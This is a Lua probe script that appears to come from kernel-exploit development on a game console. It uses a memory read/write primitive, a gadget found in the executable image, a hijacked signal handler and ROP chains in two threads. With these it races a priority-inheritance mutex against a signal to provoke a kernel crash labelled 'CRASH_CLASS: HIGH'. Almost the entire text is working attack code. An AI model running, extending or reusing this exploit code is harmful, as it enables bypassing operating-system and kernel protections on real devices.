-- CRASH_CLASS: HIGH
-- PROBE 654a: interrupt a queued PI waiter with a caught signal, then unlock
-- A signal is deliverable to one thread with thr_kill(tid, sig); SIGKILL was
-- process-fatal (651a), so install a real handler and use SIGUSR1.
print("=== PROBE 654a: PI WAITER INTERRUPTED BY SIGNAL ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local function rdd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
-- eboot: find xor eax,eax; ret
local buf=memory.alloc(72*512); local cnt=memory.alloc(8)
pcall(function() mk(674)(U(N(buf)), uint64(72), uint64(512), U(N(cnt)), uint64(0x40000000), uint64(0)) end)
local n=N(rd(N(cnt)) or 0)
print(string.format("[A0] regions=%d",n))
local eb=nil
local best=0
for i=0,math.min(n,512)-1 do
    local b=N(buf)+i*72
    local lo=rdd(b) or 0
    local hi=rdd(b+4) or 0
    local elo=rdd(b+8) or 0
    local ehi=rdd(b+0xC) or 0
    local prot=rdd(b+0x18) or 0
    local a=hi*4294967296+lo
    local z=ehi*4294967296+elo
    local sz=z-a
    if sz==0x494000 and prot%2==1 then eb=a end
    if sz>best and prot==5 then best=sz end
end
print(string.format("[A1] eboot=%s biggest_rx=%X",tostring(eb),best))
if not eb then print("[X] no eboot"); return end
local gadget=eb+0x471  -- recorded by probe 54p: xor eax,eax; ret
local b0=N(select(2,pcall(function() return memory.read_dword(gadget) end)))
if (b0 % 0x1000000) ~= 0xC3C031 then gadget=nil end
print(string.format("[A] eboot=%X gadget=%s",eb,tostring(gadget)))
if not gadget then return end
local act=memory.alloc(0x30)
for k=0,0x2F,8 do wq(N(act)+k,uint64(0)) end
wq(N(act),uint64(gadget))
wd(N(act)+0x18,0)
local rv=select(2,pcall(function() return mk(416)(uint64(30),U(N(act)),uint64(0),uint64(0),uint64(0),uint64(0)) end))
print(string.format("[B] sigaction(30) rv=%s",tostring(rv)))
local M=memory.alloc(8); wq(N(M),uint64(4))
local TID=memory.alloc(8)
local ts=memory.alloc(0x10); wq(N(ts),uint64(0)); wq(N(ts)+8,uint64(400000000))
local cA=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
cA:push_syscall_with_ret(mk(240), U(N(ts)), uint64(0), uint64(0))
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(6), uint64(0))
local cB=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cB:push_syscall_with_ret(mk(432), U(N(TID)), uint64(0), uint64(0))
cB:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
print("[C] chains built")
local ta=thread:new(cA); ta:run(true)
for i=1,120000 do local x=i end
print(string.format("[D] A locked M=%X",rd(N(M)) or 0))
local tb=thread:new(cB); tb:run(true)
for i=1,120000 do local x=i end
local tid=rd(N(TID)) or 0
print(string.format("[E] B tid=%s M=%X",tostring(tid),rd(N(M)) or 0))
if tid>0 then
    local ok,rv2=pcall(function() return mk(433)(U(tid),uint64(30),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    print(string.format("[F] thr_kill(%s,30) rv=%s",tostring(tid),tostring(ok and rv2 or "err")))
end
for i=1,150000 do local x=i end
print(string.format("[G] B retval=%s M=%X",tostring(cB.retval_addr and cB.retval_addr[2] and rd(N(cB.retval_addr[2]))),rd(N(M)) or 0))
for i=1,600000 do local x=i end
print(string.format("[H] after unlock M=%X",rd(N(M)) or 0))
local oka=pcall(function() ta:join() end)
print(string.format("[I] A joined=%s alive=%d",tostring(oka),N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] done")
